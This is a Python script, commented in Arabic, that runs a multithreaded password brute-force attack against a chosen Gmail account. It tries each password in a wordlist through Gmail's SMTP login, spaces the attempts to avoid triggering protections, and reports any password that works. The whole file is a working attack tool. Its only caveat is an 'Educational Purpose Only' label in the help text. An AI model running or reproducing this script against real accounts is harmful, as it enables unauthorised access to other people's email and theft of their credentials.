#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import smtplib
import argparse
import threading
from queue import Queue
from datetime import datetime
from colorama import init, Fore, Style

# تهيئة colorama لعرض الألوان في الواجهة
init(autoreset=True)

# ----------------------- إعدادات الهجوم -------------------------------
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
WAIT_TIME = 3  # وقت الانتظار بين المحاولات (يتجنب الحظر السريع)
MAX_THREADS = 5  # عدد الخيوط المتوازية
# ---------------------------------------------------------------------

class GmailBruteforcer:
    def __init__(self, target_email, wordlist_path, threads=MAX_THREADS, wait=WAIT_TIME):
        self.target_email = target_email
        self.wordlist_path = wordlist_path
        self.threads = threads
        self.wait = wait
        self.password_queue = Queue()
        self.stop_flag = False
        self.found_password = None
        self.attempts = 0
        self.lock = threading.Lock()

        # التحقق من صحة بيانات الإدخال
        if not os.path.exists(wordlist_path):
            raise FileNotFoundError(f"Wordlist not found: {wordlist_path}")
        if not os.path.getsize(wordlist_path):
            raise ValueError("Wordlist file is empty")

        # قراءة كلمات المرور وحشوها في الـ Queue
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for password in f:
                self.password_queue.put(password.strip())

    def attempt_login(self, password):
        """محاولة تسجيل الدخول إلى Gmail باستخدام كلمة مرور معينة."""
        if self.stop_flag:
            return False

        try:
            server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
            server.set_debuglevel(0)  # إخفاء التفاصيل التقنية في المخرجات (للوضوح)
            server.ehlo()
            server.starttls()
            server.ehlo()
            server.login(self.target_email, password)
            server.quit()
            return True
        except smtplib.SMTPAuthenticationError:
            # فشل المصادقة (هذا متوقع في معظم الحالات)
            return False
        except Exception as e:
            print_err(f"[-] Connection error for password '{password}': {str(e)}")
            return False

    def worker(self):
        """دالة العامل التي تُنفَّذ في كل خيط."""
        while not self.stop_flag:
            try:
                password = self.password_queue.get_nowait()
            except:
                break  # انتهت القائمة

            if self.stop_flag:
                break

            # محاولة تسجيل الدخول
            if self.attempt_login(password):
                with self.lock:
                    self.found_password = password
                    self.stop_flag = True
                print_success(f"\n[✔] SUCCESS!!! Password found: {Fore.GREEN}{password}{Style.RESET_ALL}")
                return

            # تحديث العداد وعرض التقدم
            with self.lock:
                self.attempts += 1
                self.print_progress(password)

            # الانتظار بين المحاولات لتجنب تفعيل الحماية
            time.sleep(self.wait)

    def print_progress(self, current_password):
        """طباعة تقدم الهجوم بشكل مرتب."""
        status = f"[{Fore.CYAN}{self.attempts}{Style.RESET_ALL}] Attempting: {current_password[:20]}"
        remaining = self.password_queue.qsize()
        status += f" | Remaining: {remaining}"
        print(f"\r{status:<80}", end="", flush=True)

    def start_attack(self):
        """بدء الهجوم باستخدام الخيوط المتعددة."""
        print_header(f"\n[*] Target Email: {Fore.YELLOW}{self.target_email}{Style.RESET_ALL}")
        print_header(f"[*] Total Passwords: {Fore.YELLOW}{self.password_queue.qsize()}{Style.RESET_ALL}")
        print_header(f"[*] Threads: {Fore.YELLOW}{self.threads}{Style.RESET_ALL}")
        print_header(f"[*] Wait time: {Fore.YELLOW}{self.wait}s{Style.RESET_ALL}")
        print_header(f"[*] Attack started at: {Fore.YELLOW}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}\n")

        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.start()
            threads.append(t)

        # انتظار انتهاء جميع الخيوط
        for t in threads:
            t.join()

        # عرض النتيجة النهائية
        if self.found_password:
            print_success(f"\n[✔] Attack completed! Password is: {Fore.GREEN}{self.found_password}{Style.RESET_ALL}")
        else:
            print_fail("\n[✘] Attack completed. Password not found in this wordlist.")

def print_header(message):
    """طباعة رسائل الرأس."""
    print(Fore.MAGENTA + Style.BRIGHT + message + Style.RESET_ALL)

def print_success(message):
    """طباعة رسائل النجاح."""
    print(Fore.GREEN + Style.BRIGHT + message + Style.RESET_ALL)

def print_fail(message):
    """طباعة رسائل الفشل."""
    print(Fore.RED + Style.BRIGHT + message + Style.RESET_ALL)

def print_err(message):
    """طباعة رسائل الأخطاء."""
    print(Fore.YELLOW + message + Style.RESET_ALL)

def main():
    parser = argparse.ArgumentParser(
        description="Gmail Bruteforce Attack Tool - Educational Purpose Only",
        epilog="Example: python3 gmail_bruteforce.py -t target@gmail.com -w wordlist.txt -T 5 -s 3"
    )
    parser.add_argument("-t", "--target", required=True, help="Target email address")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to passwords wordlist file")
    parser.add_argument("-T", "--threads", type=int, default=MAX_THREADS, help="Number of threads (default: 5)")
    parser.add_argument("-s", "--sleep", type=int, default=WAIT_TIME, help="Sleep time between attempts (default: 3 seconds)")
    parser.add_argument("--no-color", action="store_true", help="Disable colored output")

    args = parser.parse_args()

    if args.no_color:
        global Fore, Style
        Fore = Style = type('', (), {'RESET_ALL': '', 'GREEN': '', 'RED': '', 'YELLOW': '', 'CYAN': '', 'MAGENTA': ''})()

    # تنظيم المعلمات
    target = args.target.strip()
    wordlist = args.wordlist.strip()
    threads = min(args.threads, 10)  # لا يزيد عن 10 خيوط
    sleep_time = max(args.sleep, 2)  # لا يقل عن ثانيتين

    try:
        bruter = GmailBruteforcer(target, wordlist, threads, sleep_time)
        bruter.start_attack()
    except Exception as e:
        print_err(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()